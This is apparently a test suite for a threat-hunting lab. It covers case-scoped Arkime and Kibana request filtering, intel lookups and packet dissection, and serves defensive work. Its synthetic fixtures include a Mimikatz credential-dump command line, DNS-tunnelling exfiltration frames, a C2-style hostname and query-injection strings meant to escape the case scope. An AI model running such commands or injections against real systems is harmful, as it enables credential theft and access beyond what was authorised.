      const parsedWatchUrl = new URL(watchPage.url);
      const urlKey = parsedWatchUrl.searchParams.get("key")!;
      expect(urlKey.length).toBe(64);
      expect(urlKey).not.toBe(srv.secret);

      const okWatchGet = await sendRawHttp(
        `GET ${parsedWatchUrl.pathname}${parsedWatchUrl.search} HTTP/1.1\r\nHost: 127.0.0.1:${srv.port}\r\nConnection: close\r\n\r\n`,
      );
      expect(okWatchGet.statusLine).toContain("200");

      const postWatchGrant = await sendRawHttp(
        `POST ${parsedWatchUrl.pathname}${parsedWatchUrl.search} HTTP/1.1\r\nHost: 127.0.0.1:${srv.port}\r\nConnection: close\r\n\r\n`,
      );
      expect(postWatchGrant.statusLine).toContain("405");
      expect(JSON.parse(postWatchGrant.body)).toEqual({ error: "read_only" });

      const replayWatchOnApi = await sendRawHttp(
        `GET /es/search?q= HTTP/1.1\r\nHost: 127.0.0.1:${srv.port}\r\nX-Hunt-Lab-Secret: ${urlKey}\r\nConnection: close\r\n\r\n`,
      );
      expect(replayWatchOnApi.statusLine).toContain("401");
      expect(JSON.parse(replayWatchOnApi.body)).toEqual({ error: "caller_not_authorized" });

      // 6. pr1-v3 BLOCK 2: decideWatchRequest malformed `%` -> arkime_route_denied (never URIError!)
      const scope = {
        caseId: "synth-case-001",
        labOrigin: `http://127.0.0.1:${srv.port}`,
        arkimeOrigin: "http://127.0.0.1:8005",
        kibanaOrigin: "http://127.0.0.1:5601",
        startSec: 1_763_114_400,
        stopSec: 1_763_118_000,
      };
      for (const badPctUrl of [
        "http://127.0.0.1:8005/api/%E0%A4%A",
        "http://127.0.0.1:8005/api/sessions/%ZZ",
        "http://127.0.0.1:8005/%",
      ]) {
        expect(decideWatchRequest(scope, "GET", badPctUrl)).toEqual({
          block: "arkime_route_denied",
        });
      }

      // 7. Arkime POST search body unavailability, rejection, expression guard, JSON scoping & form scoping
      expect(
        decideWatchRequest(scope, "POST", "http://127.0.0.1:8005/api/sessions", null),
      ).toEqual({ block: "arkime_body_unavailable" });

      for (const badBody of ["{bad-json", "[1, 2]"]) {
        expect(
          decideWatchRequest(scope, "POST", "http://127.0.0.1:8005/api/sessions", badBody),
        ).toEqual({ block: "arkime_body_rejected" });
      }

      expect(
        decideWatchRequest(
          scope,
          "POST",
          "http://127.0.0.1:8005/api/sessions",
          JSON.stringify({ expression: ') || tags == "other"' }),
        ),
      ).toEqual({ block: "arkime_expression_rejected" });

      const scopedJsonPost = decideWatchRequest(
        scope,
        "POST",
        "http://127.0.0.1:8005/api/sessions",
        JSON.stringify({
          expression: "ip.src == 10.20.1.5",
          date: "-1",
          startTime: 1,
          stopTime: 9_999_999_999,
          fields: ["ip.src", "ip.dst"],
        }),
      );
      expect(scopedJsonPost.block).toBeNull();
      const parsedScopedBody = JSON.parse(scopedJsonPost.body!) as Record<string, unknown>;
      expect(parsedScopedBody.date).toBeUndefined();
      expect(parsedScopedBody.expression).toBe(
        '(ip.src == 10.20.1.5) && tags == "case:synth-case-001"',
      );
      expect(parsedScopedBody.startTime).toBe(scope.startSec);
      expect(parsedScopedBody.stopTime).toBe(scope.stopSec);
      expect(parsedScopedBody.fields).toEqual(["ip.src", "ip.dst"]);

      const scopedFormPost = decideWatchRequest(
        scope,
        "POST",
        "http://127.0.0.1:8005/api/spiview",
        "expression=port.dst%3D%3D443&date=-1&startTime=100&stopTime=9999999999&spi=tls.ja4",
      );
      expect(scopedFormPost.block).toBeNull();
      const outForm = new URLSearchParams(scopedFormPost.body!);
      expect(outForm.has("date")).toBe(false);
      expect(outForm.get("expression")).toBe(
        '(port.dst==443) && tags == "case:synth-case-001"',
      );
      expect(outForm.get("startTime")).toBe(String(scope.startSec));
      expect(outForm.get("stopTime")).toBe(String(scope.stopSec));
      expect(outForm.get("spi")).toBe("tls.ja4");

      expect(
        decideWatchRequest(
          scope,
          "POST",
          "http://127.0.0.1:8005/api/sessions",
          "expression=ip.src%3D%3D1.1.1.1&expression=ip.src%3D%3D2.2.2.2",
        ),
      ).toEqual({ block: "arkime_ambiguous_search" });

      // Kibana Discover batch search pinning (`browser_policy.py` `_kibana`)
      expect(
        decideWatchRequest(scope, "POST", "http://127.0.0.1:5601/internal/bsearch", null),
      ).toEqual({ block: "kibana_body_unavailable" });
      expect(
        decideWatchRequest(
          scope,
          "POST",
          "http://127.0.0.1:5601/internal/bsearch",
          JSON.stringify({
            batch: [{ options: { strategy: "es" }, request: { params: { index: "wrong-index" } } }],
          }),
        ),
      ).toEqual({ block: "kibana_index_denied" });
      const pinnedKibana = decideWatchRequest(
        scope,
        "POST",
        "http://127.0.0.1:5601/internal/bsearch",
        JSON.stringify({
          batch: [
            {
              options: { strategy: "ese" },
              request: {
                params: {
                  index: "hunt-lab-case-events",
                  body: { size: 50, query: { match_all: {} } },
                },
              },
            },
          ],
        }),
      );
      expect(pinnedKibana.block).toBeNull();
      expect(pinnedKibana.body).toContain(`"gte":${scope.startSec * 1000}`);
      expect(pinnedKibana.body).toContain(`"lt":${scope.stopSec * 1000}`);
    } finally {
      await dp.close();
    }
  });

  test("Kibana aggregation trees cannot reset or expand the enforced case scope", () => {
    const scope = {
      caseId: "synth-case-001",
      labOrigin: "http://127.0.0.1:8080",
      arkimeOrigin: "http://127.0.0.1:8005",
      kibanaOrigin: "http://127.0.0.1:5601",
      startSec: 1_763_114_400,
      stopSec: 1_763_118_000,
    };
    const decide = (search: Record<string, unknown>) => decideWatchRequest(
      scope, "POST", `${scope.kibanaOrigin}/internal/bsearch`, JSON.stringify({
        batch: [{ options: { strategy: "ese" }, request: { params: { index: "hunt-lab-case-events", body: search } } }],
      }),
    );
    for (const alias of ["aggs", "aggregations"]) {
      for (const escaping of ["global", "children", "parent", "nested", "reverse_nested", "significant_terms", "unknown_future_type"]) {
        const unsafe = { escape: { [escaping]: {}, aggs: { exposed: { terms: { field: "host.name" } } } } };
        expect(decide({ [alias]: unsafe }).block).toBe("kibana_search_denied");
        expect(decide({ [alias]: { within: { filter: { match_all: {} }, aggregations: unsafe } } }).block)
          .toBe("kibana_search_denied");
      }
      for (const malformed of [null, [], { broken: null }, { broken: {} }]) {
        expect(decide({ [alias]: malformed }).block).toBe("kibana_search_denied");
      }
      const allowed = decide({ query: { match_all: {} }, [alias]: {
        global: { terms: { field: "host.name" }, aggs: {
          timeline: { date_histogram: { field: "@timestamp", fixed_interval: "1m" },
            aggregations: { count: { value_count: { field: "event.id" } } } },
        } },
      } });
      expect(allowed.block).toBeNull();
      expect(allowed.body).toContain(`"gte":${scope.startSec * 1000}`);
      expect(allowed.body).toContain(`"lt":${scope.stopSec * 1000}`);
    }
  });

  test("returns every intel feed match without falsely classifying later indicators as unmatched", async () => {
    const dir = path.join(tmpRoot, "many-intel-feeds");
    fs.mkdirSync(dir);
    fs.writeFileSync(path.join(dir, "case.json"), JSON.stringify({
      case_id: "many-intel-feeds", data_origin: "synthetic",
      time_range_utc: { start_inclusive: "2026-11-14T10:00:00Z", end_exclusive: "2026-11-14T11:00:00Z" },
    }));
    const message = "漢😀".repeat(20_000) + "TAIL_WATCH_EVIDENCE";
    fs.writeFileSync(path.join(dir, "events.jsonl"), JSON.stringify({
      "@timestamp": "2026-11-14T10:01:00Z", event: { id: "evt-complete-message" }, message,
    }) + "\n");
    const intel = Array.from({ length: 505 }, (_, index) => ({
      id: `ioc-bulk-${index}`,
      indicator: { type: "domain-name", value: "a.example.test" },
      threat: { feed: { name: `Feed-${String(index).padStart(3, "0")}` } },
    }));
    intel.push({ id: "ioc-late", indicator: { type: "domain-name", value: "z.example.test" }, threat: { feed: { name: "LateFeed" } } });
    fs.writeFileSync(path.join(dir, "intel.jsonl"), intel.map((item) => JSON.stringify(item)).join("\n") + "\n");
    const plane = await EmbeddedHuntDataPlane.open(dir, { cacheDir });
    const parseWire = (wire: string) => {
      expect(Buffer.byteLength(wire, "utf8")).toBeLessThanOrEqual(24 * 1024);
      const match = /^<untrusted_tool_result_([0-9a-f]{32})>\n([\s\S]*)\n<\/untrusted_tool_result_\1>$/.exec(wire);
      expect(match).not.toBeNull();
      return JSON.parse(match![2]!) as { result_chunk: { data: string; next_after: string | null } };
    };
    const decodeHtml = (text: string) => text.replace(/&lt;/g, "<").replace(/&gt;/g, ">")
      .replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, "&");
    try {
      const values = "A.EXAMPLE.TEST,Z.EXAMPLE.TEST,Missing.MixedCase";
      const raw = plane.intelLookup({ values });
      expect(raw.matches).toHaveLength(506);
      expect(raw.matches.filter((item) => item["indicator.value"] === "a.example.test")).toHaveLength(505);
      expect(raw.matches[505]!["indicator.value"]).toBe("z.example.test");
      expect(raw.unmatched).toEqual(["Missing.MixedCase"]);
      const mint = createRoleCapabilityMint();
      const librarian = mint.bindDataPlane(plane, mint.issueCapability({
        huntId: "hunt-many-feeds", caseId: plane.caseId, profile: "framework-librarian",
      }));
      let wire = await librarian.executeTool("intel_lookup", { values });
      const parts: string[] = [];
      for (let index = 0; index < 100; index++) {
        const chunk = parseWire(wire).result_chunk;
        parts.push(chunk.data);
        if (chunk.next_after === null) break;
        wire = await librarian.executeTool("intel_lookup", { result_after: chunk.next_after });
      }
      expect(JSON.parse(parts.join(""))).toEqual(raw);

      const watch = await plane.labBrowser({ page: "kibana_discover" });
      let url = watch.url;
      const eventParts: string[] = [];
      for (let index = 0; index < 100; index++) {
        const response = await fetch(url, { proxy: "", redirect: "error" });
        expect(response.status).toBe(200);
        const html = await response.text();
        const pre = /<pre>([\s\S]*?)<\/pre>/.exec(html);
        expect(pre).not.toBeNull();
        const chunk = parseWire(decodeHtml(pre![1]!)).result_chunk;
        eventParts.push(chunk.data);
        const link = /<a rel="next" href="([^"]+)">/.exec(html);
        if (chunk.next_after === null) {
          expect(link).toBeNull();
          break;
        }
        expect(link).not.toBeNull();
        url = new URL(decodeHtml(link![1]!), url).toString();
        expect(new URL(url).searchParams.get("result_after") === chunk.next_after).toBe(true);
      }
      const eventResult = JSON.parse(eventParts.join("")) as { hits: Array<Record<string, unknown>> };
      expect(eventResult.hits[0]!.message).toBe(message);
    } finally {
      await plane.close();
    }
  });

  test("regression (pr1-v2 BLOCK 1 & BLOCK 2): enforces FTS5 adjacent phrases, fts5vocab ?/* wildcards, quoted leading-wildcard 400, MAX_UNIQUE_VALUES=1000, and LIKE ESCAPE", async () => {
    const luceneCaseDir = path.join(tmpRoot, "lucene-edge-case");
    fs.mkdirSync(luceneCaseDir, { recursive: true });
    const startSec = Math.floor(Date.parse("2026-11-14T10:00:00Z") / 1000);
    fs.writeFileSync(
      path.join(luceneCaseDir, "case.json"),
      JSON.stringify({
        case_id: "lucene-edge-case",
        question: "Verify Lucene FTS5 phrases/wildcards, LIKE ESCAPE, and MAX_UNIQUE_VALUES=1000",
        data_origin: "synthetic",
        time_range_utc: {
          start_inclusive: "2026-11-14T10:00:00Z",
          end_exclusive: "2026-11-14T11:00:00Z",
        },
      }),
    );

    const edgeEvents = [
      {
        "@timestamp": "2026-11-14T10:01:00Z",
        event: { id: "evt-decoy-phrase" },
        host: { name: "H-1" },
        user: { name: "bob" },
        message: "User ali logged in from e gateway and failed",
      },
      {
        "@timestamp": "2026-11-14T10:02:00Z",
        event: { id: "evt-adj-phrase" },
        host: { name: "H-1" },
        user: { name: "bob" },
        message: "User ali failed login",
      },
      {
        "@timestamp": "2026-11-14T10:03:00Z",
        event: { id: "evt-mimi" },
        host: { name: "H-1" },
        user: { name: "operator" },
        process: { command_line: "C:\\Tools\\Invoke-Mimikatz.ps1 -DumpCreds" },
        message: "Launched Mimikatz credential dump",
      },
      {
        "@timestamp": "2026-11-14T10:04:00Z",
        event: { id: "evt-ps-true" },
        host: { name: "H-1" },
        user: { name: "operator" },
        message: "Ran PowerShell script",
      },
      {
        "@timestamp": "2026-11-14T10:05:00Z",
        event: { id: "evt-ps-decoy" },
        host: { name: "H-1" },
        user: { name: "operator" },
        process: { command_line: "Invoke helper and later mimic args" },
        message: "power user opened shell",
      },
    ];
    fs.writeFileSync(
      path.join(luceneCaseDir, "events.jsonl"),
      `${edgeEvents.map((e) => JSON.stringify(e)).join("\n")}\n`,
    );

    // Build 1,005 UDP DNS frames:
    // - Frame 1 queries `_ldap._tcp.dc.corp.local`
    // - Frame 2 queries `aldapxtcp.dc.corp.local` (decoy if `_` were unescaped in SQLite LIKE!)
    // - Frame 3..1005 query `sub0003.uniq.test` .. `sub1005.uniq.test` -> 1,005 distinct `host.dns` values!
    const buildSimpleDnsQuery = (qnameStr: string): Uint8Array => {
      const hdr = Buffer.from([0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
      const labels = qnameStr.split(".").map((lbl) => {
        const b = Buffer.from(lbl, "ascii");
        return Buffer.concat([Buffer.from([b.length]), b]);
      });
      return Buffer.concat([hdr, ...labels, Buffer.from([0x00, 0x00, 0x01, 0x00, 0x01])]);
    };

    const pcapFrames: Array<{ tsSec: number; tsNsSub: number; data: Uint8Array }> = [];
    const dnsNames = [
      "_ldap._tcp.dc.corp.local",
      "aldapxtcp.dc.corp.local",
      ...Array.from({ length: 1_003 }, (_, idx) => `sub${String(idx + 3).padStart(4, "0")}.uniq.test`),
    ];
    for (let idx = 0; idx < dnsNames.length; idx++) {
      const srcPort = 40_000 + idx;
      pcapFrames.push({
        tsSec: startSec + 10 + Math.floor(idx / 100),
        tsNsSub: (idx % 100) * 1_000,
        data: buildEthIpv4Header(
          [10, 0, 0, 5],
          [10, 0, 0, 53],
          17,
          buildUdpSegment(srcPort, 53, buildSimpleDnsQuery(dnsNames[idx]!)),
        ),
      });
    }
    fs.writeFileSync(path.join(luceneCaseDir, "traffic.pcap"), buildPcapNsFile(pcapFrames));

    const dpEdge = await EmbeddedHuntDataPlane.open(luceneCaseDir, { cacheDir });
    try {
      // (a) FTS5 phrase adjacency (`"ali" + "failed"`, NOT unordered `"ali" AND "failed"`),
      //     quoted `*` stays literal (never wildcard-expanded inside quotes),
      //     and unquoted `Invoke-Mimi*` compiles to adjacent `"invoke" + "mimi"*`!
      const adjPhrase = dpEdge.elasticSearch({ q: 'message:"ali failed"' });
      expect(adjPhrase.hits.map((h) => h["event.id"])).toEqual(["evt-adj-phrase"]);

      expect(dpEdge.elasticSearch({ q: 'message:"ali fail*"' }).total).toBe(0);
      expect(
        dpEdge
          .elasticSearch({ q: "process.command_line.text:Invoke-Mimi*" })
          .hits.map((h) => h["event.id"]),
      ).toEqual(["evt-mimi"]);

      // (b) FTS5 & unqualified `?` and infix `*` wildcards (zero multi-token false positives!)
      expect(dpEdge.elasticSearch({ q: "ali?e" }).total).toBe(0);
      expect(dpEdge.elasticSearch({ q: "message:Mimik?tz" }).hits.map((h) => h["event.id"])).toEqual([
        "evt-mimi",
      ]);
      expect(dpEdge.elasticSearch({ q: "Mimik?tz" }).hits.map((h) => h["event.id"])).toEqual([
        "evt-mimi",
      ]);
      expect(
        dpEdge
          .elasticSearch({ q: "process.command_line.text:Invoke-Mimik?tz.ps1" })
          .hits.map((h) => h["event.id"]),
      ).toEqual(["evt-mimi"]);
      expect(dpEdge.elasticSearch({ q: "message:pow*shell" }).hits.map((h) => h["event.id"])).toEqual(
        ["evt-ps-true"],
      );

      // (c) Quoted & range leading wildcards -> 400 leading_wildcard_not_supported
      for (const badLeading of [
        '"*evil"',
        'message:"?bar"',
        'message:"foo *bar"',
        'host.name:["*a" TO "z"]',
        'host.name:[a TO "?z"]',
      ]) {
        try {
          dpEdge.elasticSearch({ q: badLeading });
          throw new Error(`Expected leading_wildcard_not_supported for ${badLeading}`);
        } catch (err) {
          const dpErr = extractDataPlaneError(err);
          expect(dpErr?.statusCode).toBe(400);
          expect(dpErr?.errorCode).toBe("leading_wildcard_not_supported");
        }
      }

      // (d) Network dataset LIKE ... ESCAPE '\' (`_` matches literal underscore ONLY, not 'l'/'x'!)
      const netLdap = dpEdge.huntLabQuery({ dataset: "network", q: "_ldap._tcp" }) as {
        total: number;
        records: Array<Record<string, unknown>>;
      };
      expect(netLdap.total).toBe(1);
      expect(JSON.stringify(netLdap.records[0])).toContain("_ldap._tcp.dc.corp.local");

      // (e) MAX_UNIQUE_VALUES = 1,000 (not 500!): 1,005 -> returned:1000, truncated:true
      const uniqAll = dpEdge.arkimeUnique({ field: "host.dns", counts: 1 });
      expect(uniqAll.returned).toBe(1_000);
      expect(uniqAll.truncated).toBe(true);
    } finally {
      await dpEdge.close();
    }
  });

  test("regression (pr1-v2 BLOCK 3): dissects RFC 4120 Kerberos AS-REP/TGS-REP/TGS-REQ/KRB-ERROR, split 2-segment HTTP headers, IPv6 Fragment Header (44), mid-stream out-of-order TCP, and multi-message TCP DNS/Kerberos", () => {
    const derLen = (n: number): Buffer => {
      if (n < 0x80) return Buffer.from([n]);
      if (n <= 0xff) return Buffer.from([0x81, n]);
      return Buffer.from([0x82, (n >>> 8) & 0xff, n & 0xff]);
    };
    const derTlv = (tag: number, body: Uint8Array): Buffer =>
      Buffer.concat([Buffer.from([tag]), derLen(body.length), body]);
    const buildPrincipalSeq = (parts: readonly string[]): Buffer => {
      const strs = Buffer.concat(parts.map((p) => derTlv(0x1b, Buffer.from(p, "ascii"))));
      return derTlv(
        0x30,
        Buffer.concat([
          derTlv(0xa0, Buffer.from([0x02, 0x01, 0x01])),
          derTlv(0xa1, derTlv(0x30, strs)),
        ]),
      );
    };

    // 1. RFC 4120 §5.4.2 AS-REP (0x6b) & TGS-REP (0x6d) -> cname is [4] (0xa4), crealm is [3] (0xa3)
    const asRep = derTlv(
      0x6b,
      derTlv(
        0x30,
        Buffer.concat([
          derTlv(0xa0, Buffer.from([0x02, 0x01, 0x05])),
          derTlv(0xa1, Buffer.from([0x02, 0x01, 0x0b])),
          derTlv(0xa3, derTlv(0x1b, Buffer.from("CORP.LOCAL", "ascii"))),
          derTlv(0xa4, buildPrincipalSeq(["asrep_user"])),
        ]),
      ),
    );
    const tgsRep = derTlv(
      0x6d,
      derTlv(
        0x30,
        Buffer.concat([
          derTlv(0xa0, Buffer.from([0x02, 0x01, 0x05])),
          derTlv(0xa1, Buffer.from([0x02, 0x01, 0x0d])),
          derTlv(0xa3, derTlv(0x1b, Buffer.from("CORP.LOCAL", "ascii"))),
          derTlv(0xa4, buildPrincipalSeq(["tgsrep_admin"])),
        ]),
      ),
    );
    // TGS-REQ (0x6c) WITHOUT cname [1], WITH sname [3] (`cifs/dc01.corp.local`) -> MUST NOT leak sname as CNameString!
    const tgsReqNoCname = derTlv(
      0x6c,
      derTlv(
        0x30,
        derTlv(
          0xa4,
          derTlv(
            0x30,
            Buffer.concat([
              derTlv(0xa0, Buffer.from([0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10])),
              derTlv(0xa2, derTlv(0x1b, Buffer.from("CORP.LOCAL", "ascii"))),
              derTlv(0xa3, buildPrincipalSeq(["cifs", "dc01.corp.local"])),
            ]),
          ),
        ),
      ),
    );
    // KRB-ERROR (0x7e) with cname [8] (0xa8) and sname [10] (0xaa) -> extracts ONLY cname [8]!
    const krbError = derTlv(
      0x7e,
      derTlv(
        0x30,
        Buffer.concat([
          derTlv(0xa0, Buffer.from([0x02, 0x01, 0x05])),
          derTlv(0xa1, Buffer.from([0x02, 0x01, 0x1e])),
          derTlv(0xa6, Buffer.from([0x02, 0x01, 0x06])), // KDC_ERR_C_PRINCIPAL_UNKNOWN
          derTlv(0xa8, buildPrincipalSeq(["sprayed_user"])),
          derTlv(0xaa, buildPrincipalSeq(["krbtgt", "CORP.LOCAL"])),
        ]),
      ),
    );

    const pkts: DissectedPacket[] = [];
    const dissector = new PcapStreamDissector({
      caseId: "block3-suite",
      onPacket: (p) => pkts.push(p),
    });
    const baseTs = 1_763_114_500_000_000_000n;

    dissector.processRawFrame(
      1,
      baseTs + 1n,
      200,
      buildEthIpv4Header([10, 0, 0, 10], [10, 0, 0, 5], 17, buildUdpSegment(88, 52001, asRep)),
    );
    dissector.processRawFrame(
      1,
      baseTs + 2n,
      200,
      buildEthIpv4Header([10, 0, 0, 10], [10, 0, 0, 5], 17, buildUdpSegment(88, 52002, tgsRep)),
    );
    dissector.processRawFrame(
      1,
      baseTs + 3n,
      200,
      buildEthIpv4Header([10, 0, 0, 5], [10, 0, 0, 10], 17, buildUdpSegment(52003, 88, tgsReqNoCname)),
    );
    dissector.processRawFrame(
      1,
      baseTs + 4n,
      200,
      buildEthIpv4Header([10, 0, 0, 10], [10, 0, 0, 5], 17, buildUdpSegment(88, 52004, krbError)),
    );

    expect(pkts[0]!.kv.get("kerberos.CNameString")).toEqual(["asrep_user"]);
    expect(pkts[1]!.kv.get("kerberos.CNameString")).toEqual(["tgsrep_admin"]);
    expect(pkts[2]!.wsProtocol).toBe("KRB5");
    expect(pkts[2]!.kv.get("kerberos.CNameString")).toBeUndefined(); // Never sname!
    expect(pkts[3]!.kv.get("kerberos.CNameString")).toEqual(["sprayed_user"]);

    // 2. Split 2-segment HTTP request (`Host: split.ex` + `ample.test...`)
    const ntlmBob = buildNtlmType3Base64("LAB", "bob");
    const httpSeg1 = Buffer.from("GET /stage?secret=1 HTTP/1.1\r\nHost: split.ex", "ascii");
    const httpSeg2 = Buffer.from(
      `ample.test\r\nUser-Agent: SplitAgent/2.0\r\nAuthorization: NTLM ${ntlmBob}\r\n\r\n`,
      "ascii",
    );
    dissector.processRawFrame(
      1,
      baseTs + 10n,
      200,
      buildEthIpv4Header([10, 0, 0, 5], [10, 0, 0, 80], 6, buildTcpSegment(53100, 80, 10_000, 0x18, httpSeg1)),
    );
    dissector.processRawFrame(
      1,
      baseTs + 11n,
      200,
      buildEthIpv4Header(
        [10, 0, 0, 5],
        [10, 0, 0, 80],
        6,
        buildTcpSegment(53100, 80, 10_000 + httpSeg1.length, 0x18, httpSeg2),
      ),
    );
    expect(pkts[4]!.wsProtocol).toBe("HTTP");
    expect(pkts[4]!.kv.get("http.host")).toBeUndefined(); // No truncated "split.ex"!
    expect(pkts[5]!.kv.get("http.host")).toEqual(["split.example.test"]);
    expect(pkts[5]!.kv.get("http.user_agent")).toEqual(["SplitAgent/2.0"]);
    expect(pkts[5]!.kv.get("http.request.uri")).toEqual(["/stage?[redacted]"]);
    expect(pkts[5]!.kv.get("ntlmssp.auth.username")).toEqual(["bob"]);

    // 3. IPv6 Fragment Header (`nextHeader = 44`):
    //    (a) Orphan mid-fragment (`fragOffset = 24`) with fake TCP port bytes creates ZERO phantom sessions!
    //    (b) Valid 2-fragment IPv6 UDP DNS packet reassembles and extracts DNS fields cleanly!
    const buildEthIpv6FragFrame = (
      srcAddrLastByte: number,
      dstAddrLastByte: number,
      innerNextHdr: number,
      fragOffsetBytes: number,
      moreFragments: boolean,
      fragId: number,
      fragPayload: Uint8Array,
    ): Uint8Array => {
      const ipv6PayloadLen = 8 + fragPayload.length;
      const frame = new Uint8Array(14 + 40 + ipv6PayloadLen);
      const dv = new DataView(frame.buffer);
      dv.setUint16(12, 0x86dd, false); // IPv6 EtherType
      frame[14] = 0x60; // version 6
      dv.setUint16(14 + 4, ipv6PayloadLen, false);
      frame[14 + 6] = 44; // Next Header = IPv6 Fragment (44)
      frame[14 + 7] = 64; // Hop Limit
      frame[14 + 8] = 0x20;
      frame[14 + 9] = 0x01;
      frame[14 + 10] = 0x0d;
      frame[14 + 11] = 0xb8;
      frame[14 + 23] = srcAddrLastByte;
      frame[14 + 24] = 0x20;
      frame[14 + 25] = 0x01;
      frame[14 + 26] = 0x0d;
      frame[14 + 27] = 0xb8;
      frame[14 + 39] = dstAddrLastByte;
      // 8-byte Fragment Header at offset 54
      frame[54] = innerNextHdr;
      frame[55] = 0;
      const fragWord = (fragOffsetBytes & 0xfff8) | (moreFragments ? 1 : 0);
      dv.setUint16(56, fragWord, false);
      dv.setUint32(58, fragId >>> 0, false);
      frame.set(fragPayload, 62);
      return frame;
    };

    const sessionCountBeforeOrphan = dissector.getSessions().length;
    const fakeMidTcpBytes = buildTcpSegment(44444, 443, 1, 0x18, Buffer.from("mid-frag", "ascii"));
    dissector.processRawFrame(
      1,
      baseTs + 20n,
      200,
      buildEthIpv6FragFrame(0xaa, 0xbb, 6, 24, false, 0xdeadbeef, fakeMidTcpBytes),
    );
    expect(pkts[6]!.wsProtocol).toBe("IPv6");
    expect(pkts[6]!.tcpSrcPort).toBeUndefined();
    expect(dissector.getSessions().length).toBe(sessionCountBeforeOrphan); // Zero phantom session!

    const fullIpv6UdpDns = buildUdpSegment(54321, 53, buildDnsCompressedTxtResponse());
    const v6Part1 = fullIpv6UdpDns.subarray(0, 24); // multiple of 8 bytes!
    const v6Part2 = fullIpv6UdpDns.subarray(24);
    dissector.processRawFrame(
      1,
      baseTs + 21n,
      200,
      buildEthIpv6FragFrame(0x11, 0x22, 17, 0, true, 0x10203040, v6Part1),
    );
    dissector.processRawFrame(
      1,
      baseTs + 22n,
      200,
      buildEthIpv6FragFrame(0x11, 0x22, 17, 24, false, 0x10203040, v6Part2),
    );
    expect(pkts[8]!.wsProtocol).toBe("DNS");
    expect(pkts[8]!.kv.get("dns.cname")).toEqual(["cdn.evil-tunnel.test"]);
    expect(pkts[8]!.kv.get("dns.txt")).toEqual(["exfil_chunk_01"]);

    // 4. Mid-stream out-of-order TCP (`rel < 0` without SYN): Segment 2 arrives BEFORE Segment 1!
    const oooClientHello = buildTls13ClientHelloRecord("ooo.c2.test");
    const oooMid = Math.floor(oooClientHello.length / 2);
    const oooSeg1 = oooClientHello.subarray(0, oooMid);
    const oooSeg2 = oooClientHello.subarray(oooMid);
    dissector.processRawFrame(
      1,
      baseTs + 30n,
      200,
      buildEthIpv4Header(
        [10, 0, 0, 5],
        [198, 51, 100, 77],
        6,
        buildTcpSegment(54111, 443, 5000 + oooSeg1.length, 0x18, oooSeg2),
      ),
    );
    dissector.processRawFrame(
      1,
      baseTs + 31n,
      200,
      buildEthIpv4Header(
        [10, 0, 0, 5],
        [198, 51, 100, 77],
        6,
        buildTcpSegment(54111, 443, 5000, 0x18, oooSeg1),
      ),
    );
    expect(pkts[10]!.kv.get("tls.handshake.extensions_server_name")).toEqual(["ooo.c2.test"]);
    expect(pkts[10]!.kv.get("tls.handshake.ja4")?.[0]).toMatch(/^t13d0204h2_/);

    // 5. Multi-message TCP DNS (port 53) & multi-message TCP Kerberos (port 88):
    //    advances per-record stream offsets instead of re-parsing streamBuffer[0]!
    const buildTcpDnsMsg = (host: string): Buffer => {
      const hdr = Buffer.from([0xab, 0xcd, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
      const qn = Buffer.concat(
        host.split(".").map((l) => Buffer.concat([Buffer.from([l.length]), Buffer.from(l, "ascii")])),
      );
      const msg = Buffer.concat([hdr, qn, Buffer.from([0x00, 0x00, 0x01, 0x00, 0x01])]);
      const lenPref = Buffer.alloc(2);
      lenPref.writeUInt16BE(msg.length, 0);
      return Buffer.concat([lenPref, msg]);
    };
    const tcpDns1 = buildTcpDnsMsg("first.tcp-dns.test");
    const tcpDns2 = buildTcpDnsMsg("second.tcp-dns.test");
    dissector.processRawFrame(
      1,
      baseTs + 40n,
      200,
      buildEthIpv4Header([10, 0, 0, 5], [10, 0, 0, 53], 6, buildTcpSegment(55100, 53, 20_000, 0x18, tcpDns1)),
    );
    dissector.processRawFrame(
      1,
      baseTs + 41n,
      200,
      buildEthIpv4Header(
        [10, 0, 0, 5],
        [10, 0, 0, 53],
        6,
        buildTcpSegment(55100, 53, 20_000 + tcpDns1.length, 0x18, tcpDns2),
      ),
    );
    expect(pkts[11]!.kv.get("dns.qry.name")).toEqual(["first.tcp-dns.test"]);
    expect(pkts[12]!.kv.get("dns.qry.name")).toEqual(["second.tcp-dns.test"]);

    const wrapTcpKrb = (pdu: Uint8Array): Buffer => {
      const p = Buffer.alloc(4);
      p.writeUInt32BE(pdu.length, 0);
      return Buffer.concat([p, pdu]);
    };
    const tcpKrb1 = wrapTcpKrb(buildKerberosAsReqUdp("first_krb_user"));
    const tcpKrb2 = wrapTcpKrb(buildKerberosAsReqUdp("second_krb_user"));
    dissector.processRawFrame(
      1,
      baseTs + 50n,
      200,
      buildEthIpv4Header([10, 0, 0, 5], [10, 0, 0, 88], 6, buildTcpSegment(55200, 88, 30_000, 0x18, tcpKrb1)),
    );
    dissector.processRawFrame(
      1,
      baseTs + 51n,
      200,
      buildEthIpv4Header(
        [10, 0, 0, 5],
        [10, 0, 0, 88],
        6,
        buildTcpSegment(55200, 88, 30_000 + tcpKrb1.length, 0x18, tcpKrb2),
      ),
    );
    expect(pkts[13]!.kv.get("kerberos.CNameString")).toEqual(["first_krb_user"]);
    expect(pkts[14]!.kv.get("kerberos.CNameString")).toEqual(["second_krb_user"]);
  });
});
